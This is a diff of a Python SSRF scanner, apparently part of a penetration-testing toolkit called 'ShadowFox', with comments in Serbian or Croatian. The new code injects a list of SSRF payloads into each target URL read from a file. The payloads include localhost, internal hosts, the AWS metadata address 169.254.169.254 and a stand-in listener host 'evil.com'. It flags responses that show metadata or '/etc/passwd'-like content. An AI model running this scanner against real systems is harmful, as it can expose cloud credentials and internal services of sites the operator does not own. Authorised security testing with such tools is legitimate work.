@@ -1,36 +1,50 @@
 import requests
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-from utils.log_utils import log_to_sheet, classify_severity
+import sys
+import os
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
-SSRF_PROBE = "http://127.0.0.1"  # Možeš koristiti i custom listener ako želiš
+from log_to_text import log_to_text
+from tools.auto_add_severity import classify_severity
+from logics.fuzz_ai_trigger import ai_trigger_if_needed
 
-def test_ssrf(base_url):
-    parsed = urlparse(base_url)
-    query = parse_qs(parsed.query)
+def test_ssrf(url):
+    ssrf_payloads = [
+        "http://127.0.0.1",
+        "http://localhost",
+        "http://169.254.169.254",  # AWS Metadata
+        "http://0.0.0.0",
+        "http://internal.local",
+        "http://evil.com"  # DNS log opcija kad postoji listener
+    ]
 
-    for key in query:
-        original = query[key][0]
-        query[key] = [SSRF_PROBE]
-        new_query = urlencode(query, doseq=True)
-        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
+    headers = {
+        "User-Agent": "ShadowFox-SSRF"
+    }
+
+    for payload in ssrf_payloads:
+        if "FUZZ" in url:
+            test_url = url.replace("FUZZ", payload)
+        else:
+            test_url = f"{url}?url={payload}"
 
         try:
-            r = requests.get(test_url, timeout=5)
-            if r.status_code == 200:
-                msg = f"[!] Moguća SSRF refleksija: {test_url}"
-                print(msg)
-                severity = classify_severity(msg)
-                log_to_sheet(__file__, msg) + f' | Severity: {{severity}}')
+            r = requests.get(test_url, headers=headers, timeout=10)
+            if any(keyword in r.text.lower() for keyword in ["ec2", "internal", "root:x", "localhost", "meta-data"]):
+                log_to_text(f"[SSRF] {test_url} -> {payload}")
+                severity = classify_severity(r.text)
+                ai_trigger_if_needed("SSRF", test_url, payload, r.text, severity)
+                print(f"[+] SSRF Detektovan: {test_url}")
+                return {"url": test_url, "payload": payload, "severity": severity}
+        
         except Exception as e:
-            print(f"[-] Greška SSRF za {test_url}: {e}")
+            print(f"[-] Greška kod {test_url}: {e}")
 
-def run_ssrf_scan():
-    with open("targets/targets.txt", "r") as f:
-        targets = [line.strip() for line in f if line.strip()]
-
-    for url in targets:
-        print(f"[~] Testiram SSRF na: {url}")
-        test_ssrf(url)
+    print("[-] Nema SSRF odaziva.")
+    return None
 
 if __name__ == "__main__":
-    run_ssrf_scan()
+    with open("targets/targets.txt", "r") as f:
+        targets = f.read().splitlines()
+    
+    for url in targets:
+        test_ssrf(url)
